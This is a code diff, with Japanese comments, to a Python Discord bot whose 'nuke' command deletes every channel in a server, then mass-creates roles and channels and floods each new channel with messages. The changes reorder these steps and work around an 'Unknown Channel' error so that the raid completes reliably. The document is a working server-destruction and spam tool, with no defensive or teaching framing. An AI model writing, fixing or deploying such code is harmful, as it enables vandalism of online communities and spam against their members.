@@ -1,8 +1,7 @@
-# main.py（Unknown Channel エラー回避版 nuke）
+# main.py（Render 対応・Unknown Channel 回避版）
 import os
 import asyncio
 import logging
-from datetime import datetime
 import discord
 from discord.ext import commands
 from flask import Flask, jsonify
@@ -65,24 +64,12 @@ async def nuke(ctx):
     guild = ctx.guild
     me = guild.me or guild.get_member(bot.user.id)
 
+    # 権限チェック
     if not (me.guild_permissions.manage_roles and me.guild_permissions.manage_channels and me.guild_permissions.send_messages):
         await ctx.send("Bot に必要な権限がありません（Manage Roles / Manage Channels / Send Messages）")
         return
 
-    await ctx.send("⚙️ nuke 開始...")
-
-    # 1. ロール作成
-    await ctx.send(f"🔨 ロールを {ROLE_COUNT} 個作成...")
-    for i in range(1, ROLE_COUNT + 1):
-        name = f"{ROLE_BASE}-{i}"
-        try:
-            await guild.create_role(name=name, permissions=discord.Permissions.none(), reason="nuke role create")
-        except Exception as e:
-            logger.exception(f"ロール作成失敗: {e}")
-        await asyncio.sleep(0.05)
-
-    # 2. 全チャンネル削除
-    await ctx.send("🧹 全チャンネルを削除...")
+    # 1. 全チャンネル削除
     channels_to_delete = [c for c in guild.channels]
     for c in channels_to_delete:
         try:
@@ -91,23 +78,38 @@ async def nuke(ctx):
             logger.exception(f"チャンネル削除失敗: {e}")
         await asyncio.sleep(0.05)
 
-    # 削除完了後に十分待機（Discord 内部反映のため）
-    await asyncio.sleep(3)
+    # 削除反映待ち
+    await asyncio.sleep(5)
 
-    # 3. チャンネル作成
-    await ctx.send(f"🆕 チャンネルを {CHANNEL_COUNT} 個作成...")
-    created_channels = []
-    for i in range(1, CHANNEL_COUNT + 1):
-        name = f"{CHANNEL_BASE}-{i}"
+    # 2. バックアップチャンネル作成（通知用）
+    try:
+        backup_channel = await guild.create_text_channel("nuke-backup")
+        await backup_channel.send("⚙️ nuke 開始...")
+    except Exception as e:
+        logger.exception(f"バックアップチャンネル作成失敗: {e}")
+        return  # 通知できない場合は停止
+
+    # 3. ロール作成
+    for i in range(1, ROLE_COUNT+1):
         try:
-            ch = await guild.create_text_channel(name)
+            await guild.create_role(name=f"{ROLE_BASE}-{i}", permissions=discord.Permissions.none(), reason="nuke role create")
+        except Exception as e:
+            logger.exception(f"ロール作成失敗: {e}")
+        await asyncio.sleep(0.05)
+    await backup_channel.send(f"🔨 ロール {ROLE_COUNT} 個作成完了")
+
+    # 4. チャンネル作成
+    created_channels = []
+    for i in range(1, CHANNEL_COUNT+1):
+        try:
+            ch = await guild.create_text_channel(f"{CHANNEL_BASE}-{i}")
             created_channels.append(ch)
         except Exception as e:
-            logger.exception(f"チャンネル作成失敗: {name}: {e}")
+            logger.exception(f"チャンネル作成失敗: {i}: {e}")
         await asyncio.sleep(0.3)
+    await backup_channel.send(f"🆕 チャンネル {CHANNEL_COUNT} 個作成完了")
 
-    # 4. メッセージ送信（作成済みチャンネルのみ）
-    await ctx.send("✉️ 各チャンネルにメッセージ送信...")
+    # 5. メッセージ送信
     for ch in created_channels:
         for msg in CHANNEL_MESSAGES:
             try:
@@ -116,8 +118,7 @@ async def nuke(ctx):
                 logger.exception(f"メッセージ送信失敗 ({ch.name}): {e}")
             await asyncio.sleep(0.05)
         await asyncio.sleep(0.03)
-
-    await ctx.send("✅ nuke 完了！")
+    await backup_channel.send("✅ nuke 完了！")
 
 # エントリポイント
 if __name__ == "__main__":
